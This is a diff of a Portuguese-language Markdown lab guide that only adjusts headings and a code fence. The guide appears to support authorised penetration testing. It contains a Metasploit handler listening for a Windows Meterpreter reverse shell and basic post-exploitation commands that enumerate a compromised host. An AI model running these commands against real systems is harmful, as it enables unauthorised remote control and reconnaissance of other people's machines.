@@ -10,9 +10,10 @@ msfconsole -q -x "use exploit/multi/handler; \
   set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
   set LHOST 0.0.0.0; set LPORT 8443; \
   set ExitOnSession false; run -j"
+```
 # desanexar: Ctrl+A depois D  |  voltar: screen -r c2
 
-### Comandos pós-exploração básica (coleta para o relatório)
+## Comandos pós-exploração básica (coleta para o relatório)
 
 ```
 meterpreter> getuid
@@ -24,7 +25,7 @@ meterpreter> run post/windows/gather/enum_applications
 
 ```
 
-### Encerramento da sessão (higiene do laboratório)
+## Encerramento da sessão (higiene do laboratório)
 
 ```
 meterpreter> exit
